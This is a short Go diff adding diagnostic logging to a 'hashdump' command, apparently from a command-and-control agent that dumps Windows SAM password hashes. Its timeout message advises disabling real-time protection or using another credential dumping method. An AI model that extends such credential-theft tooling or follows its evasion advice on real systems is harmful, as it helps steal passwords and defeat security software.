@@ -49,14 +49,19 @@ func (c *HashdumpCommand) Execute(task structs.Task) structs.CommandResult {
 	// blocks SAM registry access (observed on Windows 11 with Defender).
 	resultCh := make(chan structs.CommandResult, 1)
 	go func() {
-		resultCh <- c.executeInner(task)
+		innerResult := c.executeInner(task)
+		diagHashdump("goroutine-defers-done, sending on channel")
+		resultCh <- innerResult
+		diagHashdump("goroutine-channel-send-done")
 	}()
 
+	diagHashdump("execute-waiting-on-channel")
 	select {
 	case result := <-resultCh:
 		diagHashdump("execute-received-result status=" + result.Status)
 		return result
 	case <-time.After(60 * time.Second):
+		diagHashdump("execute-TIMEOUT-60s")
 		return errorf("Hashdump timed out after 60s — security software may be blocking SAM registry access.\nConsider disabling real-time protection or using an alternative credential dumping method.")
 	}
 }
@@ -109,10 +114,12 @@ func (c *HashdumpCommand) executeInner(task structs.Task) structs.CommandResult 
 		return errorf("Failed to enumerate users: %v", err)
 	}
 	defer func() {
+		diagHashdump("defer-zerostring-start")
 		for i := range users {
 			structs.ZeroString(&users[i].lmHash)
 			structs.ZeroString(&users[i].ntHash)
 		}
+		diagHashdump("defer-zerostring-done")
 	}()
 
 	if len(users) == 0 {
